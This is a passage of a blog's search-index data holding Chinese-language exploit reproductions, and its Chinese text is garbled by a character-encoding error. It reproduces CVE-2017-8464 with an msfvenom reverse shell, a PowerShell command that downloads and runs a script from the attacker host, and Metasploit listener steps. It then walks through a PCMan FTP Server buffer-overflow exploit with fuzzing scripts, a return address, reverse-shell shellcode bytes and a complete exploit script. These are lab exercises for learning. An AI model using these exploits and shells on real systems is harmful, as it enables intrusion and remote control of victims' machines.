æ‰§è¡Œæ¼æ´**æ›¾è¢«ç”¨åœ¨Stuxnetï¼ˆéœ‡ç½‘ç—…æ¯’ï¼‰è½¯ä»¶ä¸­ã€‚Nessusåœ¨æ¼æ´å…¬å¸ƒ24å°æ—¶å†…å°±å·²å…·å¤‡æ¼æ´æ£€æŸ¥å‘ç°èƒ½åŠ›ï¼ŒTenableç”¨æˆ·åªéœ€è¦è‡ªåŠ¨æ›´æ–°åˆ°æœ€æ–°çš„æ¼æ´æ’ä»¶åº“ï¼Œå°±èƒ½å…·å¤‡è¯¥æ¼æ´å‘ç°èƒ½åŠ›ã€‚RCEæ¼æ´å­˜åœ¨äºWindowså¤„ç†LNKæ–‡ä»¶çš„ç¯èŠ‚ã€‚æ”»å‡»è€…åˆ©ç”¨æ¼æ´å¯ä»¥è·å¾—ä¸æœ¬åœ°ç”¨æˆ·ç›¸åŒçš„ç”¨æˆ·æƒé™ã€‚è¢«ä½¿ç”¨æ­¤æ¼æ´æ”»å‡»æ—¶ï¼Œç”¨æˆ·æƒé™è¾ƒå°‘çš„è´¦æˆ·ç›¸è¾ƒç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·å—åˆ°çš„å½±å“æ›´å°ã€‚ æ¼æ´åç§°ï¼šLNKæ–‡ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ¼æ´ç¼–å·ï¼šCVE-2017-8464æ¼æ´ç­‰çº§ï¼šä¸¥é‡æ¼æ´æ¦‚è¦ï¼šå¦‚æœç”¨æˆ·æ‰“å¼€æ”»å‡»è€…ç²¾å¿ƒæ„é€ çš„æ¶æ„LNKæ–‡ä»¶ï¼Œåˆ™ä¼šé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯ä»¥è·å¾—ä¸æœ¬åœ°ç”¨æˆ·ç›¸åŒçš„ç”¨æˆ·æƒé™ã€‚ æ”»å‡»è€…å¯ä»¥é€šè¿‡å¯ç§»åŠ¨é©±åŠ¨å™¨(Uç›˜)æˆ–è¿œç¨‹å…±äº«ç­‰æ–¹å¼å°†åŒ…å«æ¶æ„LNKæ–‡ä»¶å’Œä¸ä¹‹ç›¸å…³çš„æ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ä¼ æ’­ç»™ç”¨æˆ·ã€‚å½“ç”¨æˆ·é€šè¿‡Windowsèµ„æºç®¡ç†å™¨æˆ–ä»»ä½•èƒ½å¤Ÿè§£æLNKæ–‡ä»¶çš„ç¨‹åºæ‰“å¼€æ¶æ„çš„LNKæ–‡ä»¶æ—¶ï¼Œä¸ä¹‹å…³è”çš„æ¶æ„äºŒè¿›åˆ¶ä»£ç å°†åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œã€‚ æ¼æ´åˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼ï¼šè¿œç¨‹åˆ©ç”¨æ¼æ´å½±å“èŒƒå›´: Microsoft Windows 10 Version 1607 for 32-bit Systems Microsoft Windows 10 Version 1607 for x64-based Systems Microsoft Windows 10 for 32-bit Systems Microsoft Windows 10 for x64-based Systems Microsoft Windows 10 version 1511 for 32-bit Systems Microsoft Windows 10 version 1511 for x64-based Systems Microsoft Windows 10 version 1703 for 32-bit Systems Microsoft Windows 10 version 1703 for x64-based Systems Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows 8.1 for 32-bit Systems Microsoft Windows 8.1 for x64-based Systems Microsoft Windows RT 8.1 æœåŠ¡å™¨ç³»ç»Ÿ Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows Server 2012 Microsoft Windows Server 2012 R2 Microsoft Windows Server 2016 æ¼æ´å¤ç°Kaliï¼š 172.16.9.195 é¶æœºï¼š172.16.9.178 1ã€Kaliç”Ÿæˆä¸€ä¸ªps1çš„åå¼¹shellæœ¨é©¬ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.9.195 lport=4448 -f psh-reflection>/root/search.ps1 2ã€Kaliå¼€å¯httpæœåŠ¡ï¼Œå°†search.ps1æ–‡ä»¶ç§»åŠ¨è‡³webæ ¹ç›®å½•ä¸‹ mv search.ps1 /var/www/html systemctl start apache2 3ã€é¶æœºè®¿é—®Kali webæœåŠ¡å™¨ä¸‹çš„search.ps1æ–‡ä»¶ï¼Œå‘ç°å¯ä»¥ç›´æ¥è®¿é—® 4ã€åœ¨é¶æœºä¸Šåˆ›å»ºä¸€ä¸ªPowerShellè¿œç¨‹å¿«æ·æ–¹å¼ powershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://172.16.9.195/search.ps1');test.ps1\" 5ã€Kaliè¿›è¡Œç›‘å¬ï¼Œé¶æœºæ‰§è¡Œåé—¨æ–‡ä»¶ use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp show options set LHOST 172.16.9.195 set lport 4448 exploit msfæ¨¡å—å®ç°msfconsole search cve-2017-8464 use exploit/windows/fileformat/cve_2017_8464_lnk_rce set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 172.16.9.195 exploit åœ¨/root/.msf4/localç›®å½•ä¸‹ç”Ÿæˆæˆ‘ä»¬çš„åˆ©ç”¨æ–‡ä»¶ å…¨éƒ¨å¤åˆ¶åˆ°ç§»åŠ¨ç£ç›˜é‡Œé¢(uç›˜æ‹·è´) ç„¶ååœ¨msfä¸­ç›‘å¬ search multi/handler use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 172.16.9.195 run","categories":[],"tags":[{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"LNK","slug":"LNK","permalink":"https://ms12020.github.io/tags/LNK/"}]},{"title":"ç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨(ä¸€)","slug":"ç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨(ä¸€)","date":"2021-04-25T12:16:08.949Z","updated":"2021-05-03T03:38:11.066Z","comments":true,"path":"2021/04/25/ç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨(ä¸€)/","link":"","permalink":"https://ms12020.github.io/2021/04/25/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8(%E4%B8%80)/","excerpt":"","text":"PCManâ€™s FTP Serverç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨çŸ¥è¯†å¤§éƒ¨åˆ†æ¥æºäºå­¦é•¿Taoâ€™s Blog ç®€å•åŸç† ç®€å•çš„æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„æ•°æ®é•¿åº¦è¶…è¿‡äº†å¼€å‘äººå‘˜å®šä¹‰çš„ç¼“å†²åŒºï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°æ®å°±å¯ä»¥è¦†ç›–æ‰å…³é”®çš„å¯„å­˜å™¨ï¼Œå¦‚EIPï¼ŒEIPæ˜¯æŒ‡ä»¤å¯„å­˜å™¨ï¼Œå®ƒå­˜æ”¾å½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚å¦‚æœå®ƒè¢«æ¥è‡ªç”¨æˆ·è¾“å…¥çš„åƒåœ¾æ•°æ®è¦†ç›–äº†ï¼Œç¨‹åºé€šå¸¸ä¼šå´©æºƒï¼Œå› ä¸ºå®ƒè·³è½¬åˆ°çš„åœ°å€å¹¶å°è¯•æŒ‡å‘ï¼Œä½†æ‰§è¡Œçš„å¹¶ä¸æ˜¯æœ‰æ•ˆçš„æŒ‡ä»¤ã€‚æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è¦å®šåˆ¶ä¸€ä¸ªæ•°æ®å‘é€åˆ°ç¨‹åºè¦†ç›–EIPï¼Œä½¿ç¨‹åºè·³è½¬åˆ°æˆ‘ä»¬æ§åˆ¶çš„ä½ç½®ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œshellcodeäº† æŸ¥æ‰¾ç¼“å†²åŒºæº¢å‡ºæ¨¡ç³Šæµ‹è¯•(Fuzzing) å› ä¸ºæˆ‘ä»¬è¦å®Œæˆä¸€æ¬¡ç¼“å†²åŒºæº¢å‡ºæµ‹è¯•ï¼Œå› æ­¤æˆ‘ä»¬ç°åœ¨å°±éœ€è¦çŸ¥é“å“ªé‡Œä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºï¼Œè¿™é‡Œæˆ‘ä»¬å°±éœ€è¦è¿›è¡Œæ¨¡ç³Šæµ‹è¯•(fuzzing),ç°åœ¨æˆ‘ä»¬éœ€è¦å‘é€ä¸åŒé•¿åº¦å’Œå†…å®¹çš„è‡ªå®šä¹‰å­—ç¬¦ä¸²åˆ°æˆ‘ä»¬è¦æµ‹è¯•çš„è¾“å…¥ç‚¹ï¼Œå¦‚æœç¨‹åºå´©æºƒ,é‚£ä¹ˆæˆ‘ä»¬å°±ä½¿ç”¨è°ƒè¯•å·¥å…·è°ƒæŸ¥ä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šå´©æºƒï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨,è¿™é‡Œæˆ‘ä»¬ä»¥PCManâ€™s FTP Server 2.0.7ä¸ºä¾‹å­ é¦–å…ˆæ¥æµ‹è¯•ä¸€ä¸‹ç”¨æˆ·åè¿™ä¸ªè¾“å…¥ç‚¹æœ‰æ²¡æœ‰å­˜åœ¨é—®é¢˜ã€‚ #!/usr/bin/env python import sys import socket # é€šè¿‡è°ƒç”¨ç¨‹åºåé¢çš„ç¬¬ä¸€ä¸ªå‚æ•°å¾—åˆ°IPåœ°å€ host = sys.argv[1] # é€šè¿‡è°ƒç”¨ç¨‹åºåé¢çš„ç¬¬äºŒä¸ªå‚æ•°ç›®æ ‡çš„ç«¯å£,è½¬æ¢æˆintç±»å‹ port = int(sys.argv[2]) # è®¾ç½®åˆå§‹å­—ç¬¦æ•°åˆ—ä¸º100 fuzz = 100 while True: try: # åˆ›å»ºå¥—æ¥å­— s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # è¿›è¡Œè¿æ¥ï¼Œconnectå‚æ•°ä¸ºå…ƒç»„ s.connect((host, port)) s.settimeout(2) # å¯¹ç”¨æˆ·åå˜é‡è¿›è¡Œæº¢å‡ºæµ‹è¯• s.send(\"USER\" + \"A\"*fuzz) s.recv(1024) s.send(\"PASS Sheng\") s.recv(1024) print \"Send str length: \" + str(fuzz) # æ­¥é•¿ fuzz += 100 except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() æ‰“å¼€Immunityinc debuggerï¼Œç„¶åFile-&gt;Attach (é¦–å…ˆè¦ç¡®ä¿FTPç¨‹åºå·²ç»åœ¨è¿è¡Œ) æ­¤æ—¶ç¨‹åºå·²ç»åŠ è½½è¿›æ¥ï¼Œæ˜¯æš‚åœçŠ¶æ€ï¼Œ æˆ‘ä»¬ä½¿ç”¨å¿«æ·é”®F9è®©ç¨‹åºè·‘èµ·æ¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨èœå•æ çš„è¿è¡ŒæŒ‰é’® å½“ç¨‹åºå¤„äºRunningçŠ¶æ€çš„æ—¶å€™ï¼Œæˆ‘ä»¬å†ä¸€æ¬¡è¿è¡Œfuzzing.pyè„šæœ¬ã€‚ æŸ¥æ‰¾åç§»é‡ï¼ˆFinding the offsetï¼‰ ä½¿ç”¨Metasploitçš„pattern_createå·¥å…·åˆ›å»ºä¸€ä¸ª500å¤§å°çš„å­—ç¬¦ä¸² é€šè¿‡ä¸Šé¢çš„æµ‹è¯•ï¼Œå¤§æ¦‚åˆ¤æ–­æº¢å‡ºå­—ç¬¦åœ¨2000-2100, é‚£ä¹ˆæˆ‘ä»¬å¡«å†™&#39;A&#39; * 1900 + &quot;å·¥å…·ç”Ÿæˆå­—ç¬¦&quot; æ„æˆpayloadå‘é€è‡³FTPæœåŠ¡ç«¯ #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2000 payload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\" while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + payload) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() EIPå¯„å­˜å™¨çš„å€¼æ˜¯0x64413564, ä¸ºäº†è®¡ç®—è¿™ä¸ªå€¼åç§»é‡ï¼Œæˆ‘ä»¬ä½¿ç”¨Metasploitä¸­çš„å¦ä¸€ä¸ªå·¥å…·pattern_offsetæ¥ç¡®å®šå­—èŠ‚æ•° ./pattern_offset.rb -l 500 -q 61413161 # -qå‚æ•°ä¸ºè¦æŸ¥è¯¢çš„åœ°å€ï¼Œ-lå‚æ•°ä¸ºè¦æŸ¥è¯¢çš„å­—ç¬¦åºåˆ—çš„é•¿åº¦ # ä¸Šå›¾ä¸­æˆ‘ä»¬å¾—å‡ºçš„åœ°å€æ˜¯ 0x61413161, è€Œç”Ÿæˆçš„å­—ç¬¦ä¸²é•¿åº¦ä¸º500ï¼Œ å› æ­¤è¿™é‡Œä½¿ç”¨ -l 500 -q 61413161 è®¡ç®—ç»“æœä¸º4, ä¹Ÿå°±æ˜¯è¯´è¦†ç›–è¿”å›åœ°å€æ˜¯åœ¨[2005-2009] è¿™å››ä¸ªå­—èŠ‚ éªŒè¯ #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + \"B\"*4) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() å‘ç°EIPï¼ˆç¨‹åºè¿”å›åœ°å€ï¼‰è¢«æˆ‘ä»¬ä¸Šé¢çš„4ä¸ªBç»™è¦†ç›–äº†ï¼Œåˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥ç²¾ç¡®çš„è¦†ç›–EIPäº† å¯»æ‰¾shellcodeä½ç½® åœ¨ä¸Šé¢ç¨‹åºpyloadåé¢åŠ 100ä¸ªCï¼Œç„¶åæ‰§è¡Œ #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + \"B\"*4 + \"C\"*100) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡ŒESPæŒ‡å‘çš„æ˜¯æˆ‘ä»¬åœ¨EIPåé¢ç»™çš„100ä¸ªC, ç°åœ¨æˆ‘ä»¬æ˜¯è¦å°†Cæ›¿æ¢æˆæˆ‘ä»¬å¸Œæœ›è¿è¡Œçš„Shellcodeã€‚ç„¶åè®©EIPè·³è½¬åˆ°ESPå¯„å­˜å™¨çš„ä½ç½® æŸ¥çœ‹å¯å­˜æ”¾shellcodeçš„ä½ç½®å¤§å°#!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + \"B\"*4 + \"C\"*1000) s.recv(1024) s.send(\"PASS Sheng\") s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() å‘ç°è¶³å¤Ÿå®¹çº³shellcodeçš„å¤§å°(æ™®é€šçš„shellcodeå¤§å°ä¸º300-400å­—èŠ‚) æŸ¥æ‰¾åå­—ç¬¦ ä¸åŒç±»å‹çš„ç¨‹åºï¼Œåè®®ï¼Œæ¼æ´ï¼Œä¼šå°†æŸäº›å­—ç¬¦è®¤ä¸ºæ—¶åå­—ç¬¦ï¼Œè¿™äº›å­—ç¬¦æœ‰å›ºå®šç”¨é€” è¿”å›åœ°å€ã€Shellcodeã€butterä¸­éƒ½ä¸èƒ½å‡ºç°åå­—ç¬¦ NULL byte0x00è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“æŸ renturn 0x0Dè¡¨ç¤ºæ¢è¡Œï¼Œè¡¨ç¤ºå‘½ä»¤è¾“å…¥å®Œæˆ 0x0Aè¡¨ç¤ºå›è½¦ æŸ¥æ‰¾åå­—ç¬¦æ€è·¯ï¼š å‘é€(0x00â€“0xff)256ä¸ªå­—ç¬¦ï¼ŒæŸ¥æ‰¾æ‰€æœ‰åå­—ç¬¦ #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 badchars = ( \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\\x00\" ) while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + \"B\"*4 + badchars) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() å‘ç°åå­—ç¬¦ä¹‹å0x0a é‡å®šå‘æ•°æ®æµ ç”¨ESPåœ°å€ä»£æ›¿EIPçš„å€¼ï¼Œä½†æ˜¯ESPåœ°å€æ˜¯å˜åŒ–çš„ï¼Œä¸èƒ½ä¸€ç›´æŒ‰ç…§åŒä¸€ä¸ªåœ°å€è¿›è¡Œç¼–ç  æ€è·¯ï¼š åœ¨å†…å­˜åœ°å€ä¸­å¯»æ‰¾å›ºå®šçš„ç³»ç»Ÿæ¨¡å— jmp espæ˜¯æ±‡ç¼–è¯­è¨€,è½¬æˆåå…­è¿›åˆ¶å¯ä»¥ä½¿ç”¨nasm_shell.rb åœ¨æ¨¡å—ä¸­å¯»æ‰¾JMP ESPæŒ‡ä»¤çš„åœ°å€è·³è½¬ï¼Œå†ç”±è¯¥æŒ‡ä»¤é—´æ¥è·³è½¬è‡³ESPï¼Œä»è€Œæ‰§è¡Œshellcode ä½¿ç”¨Immunityinc debugger åœ¨ç¨‹åºçš„dllä¸­æ‰¾åˆ°å…·æœ‰JMP ESPå‘½ä»¤çš„å†…å­˜åœ°å€ #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz +\"\\x7b\\x46\\x86\\x7c\" + \"C\"*500 ) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() s.close() è¿™é‡Œæˆ‘ä»¬é€‰æ‹©kernel32.dll è¿›è¡Œæœç´¢ï¼Œ æœç´¢JMP ESPå‘½ä»¤ è¿™é‡Œè¿”å›çš„å†…å­˜åœ°å€ä¸º0x7C86467B, è¿™ä¸ªåœ°å€æ²¡æœ‰åå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥æ¥åˆ©ç”¨ï¼ˆåå­—ç¬¦æ˜¯ä¼šç ´åæˆ‘ä»¬æ¼æ´çš„å­—ç¬¦ï¼Œå¦‚0x00ï¼‰,å› ä¸ºè¿™é‡Œæˆ‘ä»¬æ˜¯å°ç«¯æ˜¾ç¤ºï¼Œæ‰€ä»¥æ„é€ shellcodeçš„æ—¶å€™éœ€è¦å€’è¿‡æ¥å†™ï¼ æŒ‰F7æ‰§è¡Œä¸‹ä¸€æ­¥ ç”Ÿæˆshellcodemsfvenom -p windows/shell_reverse_tcp LHOST=10.7.5.150 LPORT=1234 EXITFUNC=thread -f python -b \"\\x00\\x0a\\x0d\" -a x86 # -b \"\\x00\\x0a\\x0d\" å»æ‰åå­—ç¬¦ #!/usr/bin/env python import sys import socket buf = b\"\" buf += b\"\\xdd\\xc1\\xd9\\x74\\x24\\xf4\\x58\\xbb\\x23\\x98\\x46\\x1c\\x29\" buf += b\"\\xc9\\xb1\\x52\\x31\\x58\\x17\\x83\\xc0\\x04\\x03\\x7b\\x8b\\xa4\" buf += b\"\\xe9\\x87\\x43\\xaa\\x12\\x77\\x94\\xcb\\x9b\\x92\\xa5\\xcb\\xf8\" buf += b\"\\xd7\\x96\\xfb\\x8b\\xb5\\x1a\\x77\\xd9\\x2d\\xa8\\xf5\\xf6\\x42\" buf += b\"\\x19\\xb3\\x20\\x6d\\x9a\\xe8\\x11\\xec\\x18\\xf3\\x45\\xce\\x21\" buf += b\"\\x3c\\x98\\x0f\\x65\\x21\\x51\\x5d\\x3e\\x2d\\xc4\\x71\\x4b\\x7b\" buf += b\"\\xd5\\xfa\\x07\\x6d\\x5d\\x1f\\xdf\\x8c\\x4c\\x8e\\x6b\\xd7\\x4e\" buf += b\"\\x31\\xbf\\x63\\xc7\\x29\\xdc\\x4e\\x91\\xc2\\x16\\x24\\x20\\x02\" buf += b\"\\x67\\xc5\\x8f\\x6b\\x47\\x34\\xd1\\xac\\x60\\xa7\\xa4\\xc4\\x92\" buf += b\"\\x5a\\xbf\\x13\\xe8\\x80\\x4a\\x87\\x4a\\x42\\xec\\x63\\x6a\\x87\" buf += b\"\\x6b\\xe0\\x60\\x6c\\xff\\xae\\x64\\x73\\x2c\\xc5\\x91\\xf8\\xd3\" buf += b\"\\x09\\x10\\xba\\xf7\\x8d\\x78\\x18\\x99\\x94\\x24\\xcf\\xa6\\xc6\" buf += b\"\\x86\\xb0\\x02\\x8d\\x2b\\xa4\\x3e\\xcc\\x23\\x09\\x73\\xee\\xb3\" buf += b\"\\x05\\x04\\x9d\\x81\\x8a\\xbe\\x09\\xaa\\x43\\x19\\xce\\xcd\\x79\" buf += b\"\\xdd\\x40\\x30\\x82\\x1e\\x49\\xf7\\xd6\\x4e\\xe1\\xde\\x56\\x05\" buf += b\"\\xf1\\xdf\\x82\\x8a\\xa1\\x4f\\x7d\\x6b\\x11\\x30\\x2d\\x03\\x7b\" buf += b\"\\xbf\\x12\\x33\\x84\\x15\\x3b\\xde\\x7f\\xfe\\x4e\\x18\\x7a\\x90\" buf += b\"\\x26\\x24\\x84\\x7d\\xe6\\xa1\\x62\\x17\\x18\\xe4\\x3d\\x80\\x81\" buf += b\"\\xad\\xb5\\x31\\x4d\\x78\\xb0\\x72\\xc5\\x8f\\x45\\x3c\\x2e\\xe5\" buf += b\"\\x55\\xa9\\xde\\xb0\\x07\\x7c\\xe0\\x6e\\x2f\\xe2\\x73\\xf5\\xaf\" buf += b\"\\x6d\\x68\\xa2\\xf8\\x3a\\x5e\\xbb\\x6c\\xd7\\xf9\\x15\\x92\\x2a\" buf += b\"\\x9f\\x5e\\x16\\xf1\\x5c\\x60\\x97\\x74\\xd8\\x46\\x87\\x40\\xe1\" buf += b\"\\xc2\\xf3\\x1c\\xb4\\x9c\\xad\\xda\\x6e\\x6f\\x07\\xb5\\xdd\\x39\" buf += b\"\\xcf\\x40\\x2e\\xfa\\x89\\x4c\\x7b\\x8c\\x75\\xfc\\xd2\\xc9\\x8a\" buf += b\"\\x31\\xb3\\xdd\\xf3\\x2f\\x23\\x21\\x2e\\xf4\\x43\\xc0\\xfa\\x01\" buf += b\"\\xec\\x5d\\x6f\\xa8\\x71\\x5e\\x5a\\xef\\x8f\\xdd\\x6e\\x90\\x6b\" buf += b\"\\xfd\\x1b\\x95\\x30\\xb9\\xf0\\xe7\\x29\\x2c\\xf6\\x54\\x49\\x65\" # \"\\x90\" * 30 30ä¸ªæ— æ“ä½œç¬¦ payload = \"A\" * 2004 + \"\\x7b\\x46\\x86\\x7c\" + \"\\x90\" * 30 + buf host = sys.argv[1] # receive IP port = int(sys.argv[2]) # receive port s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(\"USER \" + payload) s.recv(1024) æœ¬åœ°ç›‘å¬4455ç«¯å£ nc -vlp 4455","categories":[],"tags":[{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"ç¼“å†²åŒºæº¢å‡º","slug":"ç¼“å†²åŒºæº¢å‡º","permalink":"https://ms12020.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"}]},{"title":"ç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨(äºŒ)","slug":"ç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨(äºŒ)","date":"2021-04-25T12:16:00.591Z","updated":"2021-04-25T12:17:17.724Z","comments":true,"path":"2021/04/25/ç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨(äºŒ)/","link":"","permalink":"https://ms12020.github.io/2021/04/25/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8(%E4%BA%8C)/","excerpt":"","text":"Vulnserveræº¢å‡ºæ¼æ´åˆ†æä¸åˆ©ç”¨ vulnserver.exeæ˜¯è¿è¡Œåœ¨windowsä¸Šçš„ç¨‹åºï¼Œå¯åŠ¨åï¼Œç­‰å¾…æ¥æ”¶TCPè¿æ¥ã€‚ ä¿¡æ¯æ”¶é›†nmapæ‰«æç›®æ ‡æœºï¼Œå¾—çŸ¥å¼€å¯9999ç«¯å£ï¼Œå³vulnserverç¨‹åºã€‚ 